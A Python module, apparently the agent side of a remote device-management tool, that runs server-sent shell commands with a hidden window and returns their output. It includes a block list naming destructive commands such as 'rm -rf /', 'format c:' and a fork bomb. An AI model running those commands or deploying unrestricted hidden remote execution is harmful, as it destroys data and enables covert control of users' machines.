"""
terminal_handler.py - Agent-side terminal command executor.
Executes commands on the device and sends output back to server.
"""
import os
import subprocess
import threading
import logging
import time

logger = logging.getLogger(__name__)

# Commands that should never execute regardless
BLOCKED_PATTERNS = [
    'format c:', 'del /f /s /q c:\\', 'rmdir /s /q c:\\',
    'rm -rf /', ':(){:|:&};:',
]

TIMEOUT_SECONDS = 30


class TerminalHandler:
    def __init__(self, data_sender, log_callback=None):
        self._ds  = data_sender
        self._log = log_callback or logger.info
        self._cwd = os.path.expanduser('~')  # Start in user home

    def execute(self, cmd_id: str, command: str, cwd: str = None):
        """Execute command in background thread."""
        threading.Thread(
            target=self._run,
            args=(cmd_id, command, cwd),
            daemon=True
        ).start()

    def _run(self, cmd_id: str, command: str, cwd: str = None):
        # Use provided cwd or current
        work_dir = cwd if (cwd and os.path.isdir(cwd)) else self._cwd

        # Block dangerous patterns
        cmd_lower = command.lower().strip()
        for blocked in BLOCKED_PATTERNS:
            if blocked in cmd_lower:
                self._log(f"[Terminal] Blocked: {command}")
                self._ds.send_terminal_result(
                    cmd_id=cmd_id,
                    output='[BLOCKED] Command ini diblokir karena alasan keamanan.',
                    cwd=work_dir,
                    exit_code=1,
                    success=False,
                )
                return

        self._log(f"[Terminal] Execute: {command} (cwd: {work_dir})")

        # Handle cd command specially (changes working directory)
        stripped = command.strip()
        if stripped.lower().startswith('cd ') or stripped.lower() == 'cd':
            self._handle_cd(cmd_id, stripped, work_dir)
            return

        try:
            no_window = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                cwd=work_dir,
                timeout=TIMEOUT_SECONDS,
                creationflags=no_window,
                encoding='utf-8',
                errors='replace',
            )
            output = result.stdout or ''
            if result.stderr:
                output += '\n' + result.stderr if output else result.stderr
            output = output.strip()
            exit_code = result.returncode

            self._log(f"[Terminal] Done: exit={exit_code}")
            self._ds.send_terminal_result(
                cmd_id=cmd_id,
                output=output or '(no output)',
                cwd=work_dir,
                exit_code=exit_code,
                success=(exit_code == 0),
            )
        except subprocess.TimeoutExpired:
            self._log(f"[Terminal] Timeout: {command}")
            self._ds.send_terminal_result(
                cmd_id=cmd_id,
                output=f'[TIMEOUT] Command melebihi batas waktu {TIMEOUT_SECONDS} detik.',
                cwd=work_dir,
                exit_code=124,
                success=False,
            )
        except Exception as e:
            self._log(f"[Terminal] Error: {e}")
            self._ds.send_terminal_result(
                cmd_id=cmd_id,
                output=f'[ERROR] {str(e)}',
                cwd=work_dir,
                exit_code=1,
                success=False,
            )

    def _handle_cd(self, cmd_id: str, command: str, current_cwd: str):
        """Handle cd command - change working directory."""
        parts = command.split(None, 1)
        if len(parts) == 1:
            # cd alone → go to home
            new_dir = os.path.expanduser('~')
        else:
            target = parts[1].strip().strip('"\'')
            if os.path.isabs(target):
                new_dir = target
            else:
                new_dir = os.path.normpath(os.path.join(current_cwd, target))

        if os.path.isdir(new_dir):
            self._cwd = new_dir
            output = ''  # cd success = no output on Windows
            self._ds.send_terminal_result(
                cmd_id=cmd_id, output=output,
                cwd=new_dir, exit_code=0, success=True,
            )
        else:
            self._ds.send_terminal_result(
                cmd_id=cmd_id,
                output=f'The system cannot find the path specified: {new_dir}',
                cwd=current_cwd, exit_code=1, success=False,
            )

    def get_cwd(self) -> str:
        return self._cwd
